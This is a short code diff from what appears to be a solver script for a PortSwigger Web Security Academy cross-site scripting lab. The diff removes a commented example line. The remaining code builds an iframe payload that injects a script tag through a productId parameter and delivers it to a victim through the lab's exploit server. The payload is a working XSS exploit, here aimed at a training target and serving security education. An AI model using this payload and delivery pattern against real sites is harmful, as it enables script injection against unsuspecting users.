@@ -9,8 +9,6 @@ def run(url, payload, proxies=None):
     response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
     url = url.rstrip('/')
     payload = f"""<iframe src="{url}/product?productId=1&'><script>print()</script>"  onload="if(!window.x)this.src='{url}';window.x=1;">"""
-    
-    # <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
 
     data = {"responseBody": payload, "responseHead": response_head,
             "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit"}
